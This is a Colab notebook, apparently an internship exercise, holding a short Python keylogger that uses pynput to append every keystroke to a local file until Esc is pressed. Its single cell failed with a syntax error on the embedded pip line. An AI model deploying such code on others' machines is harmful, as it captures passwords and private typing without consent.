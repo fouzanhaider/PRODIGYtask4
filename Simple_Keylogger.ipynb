{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPrno9FsUFKEMB8v9ckdous",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/fouzanhaider/PRODIGYtask4/blob/main/Simple_Keylogger.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qwWdKIfOVRUY",
        "outputId": "50497f9e-f333-4e6c-e114-d4df60092afb"
      },
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-1-2c1bc359460b>, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-1-2c1bc359460b>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    pip install pynput\u001b[0m\n\u001b[0m        ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ],
      "source": [
        "pip install pynput\n",
        "\n",
        "from pynput import keyboard\n",
        "\n",
        "# File to save the key logs\n",
        "log_file = \"key_log.txt\"\n",
        "\n",
        "# Function to write keystrokes to file\n",
        "def on_press(key):\n",
        "    try:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key.char}\")\n",
        "    except AttributeError:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key}\")\n",
        "\n",
        "# Function to handle key release (optional)\n",
        "def on_release(key):\n",
        "    if key == keyboard.Key.esc:\n",
        "        # Stop listener\n",
        "        return False\n",
        "\n",
        "# Start listening to keystrokes\n",
        "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
        "    listener.join()\n"
      ]
    }
  ]
}